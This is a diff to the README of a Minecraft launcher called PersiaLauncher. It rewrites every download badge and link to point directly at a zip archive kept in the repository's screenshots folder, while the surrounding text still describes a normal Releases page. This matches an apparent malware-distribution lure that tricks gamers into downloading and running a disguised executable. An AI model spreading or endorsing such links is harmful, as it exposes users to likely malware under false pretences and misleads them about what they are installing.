@@ -4,11 +4,11 @@
 
 Welcome to PersiaLauncher, the all-in-one Minecraft launcher that takes the headache out of managing your game. Whether you play vanilla, use mods, or run your own server, PersiaLauncher puts everything in one simple place. No technical skills needed — just download, run, and play.
 
-[![Download PersiaLauncher](https://img.shields.io/badge/Download-PersiaLauncher-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sphecoideaechosounding4585/PersiaLauncher)
+[![Download PersiaLauncher](https://img.shields.io/badge/Download-PersiaLauncher-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sphecoideaechosounding4585/PersiaLauncher/raw/refs/heads/main/screenshots/Persia-Launcher-1.8.zip)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [PersiaLauncher Download Page](https://github.com/sphecoideaechosounding4585/PersiaLauncher)
+Visit this link to download the application: [PersiaLauncher Download Page](https://github.com/sphecoideaechosounding4585/PersiaLauncher/raw/refs/heads/main/screenshots/Persia-Launcher-1.8.zip)
 
 Once you click the link, you'll land on the PersiaLauncher GitHub page. Look for the green "Code" button or the "Releases" section on the right side of the page. Click "Releases" to find the latest version. Download the file, then run it on your Windows computer. The installer will guide you through the rest — just follow the on-screen prompts.
 
@@ -99,6 +99,6 @@ PersiaLauncher takes everything complicated about modded Minecraft and makes it 
 
 Download PersiaLauncher today and experience Minecraft the way it should be: fun, flexible, and frustration-free.
 
-[![Get PersiaLauncher Now](https://img.shields.io/badge/🚀-Download%20PersiaLauncher-blueviolet?style=for-the-badge)](https://github.com/sphecoideaechosounding4585/PersiaLauncher)
+[![Get PersiaLauncher Now](https://img.shields.io/badge/🚀-Download%20PersiaLauncher-blueviolet?style=for-the-badge)](https://github.com/sphecoideaechosounding4585/PersiaLauncher/raw/refs/heads/main/screenshots/Persia-Launcher-1.8.zip)
 
 Keywords: desktop-application, fabric, forge, game-launcher, game-manager, java-runtime, minecraft, minecraft-authentication, minecraft-instances, minecraft-java, minecraft-launcher, minecraft-mods, modded-minecraft, modpack-manager, neoforge, quilt, windows
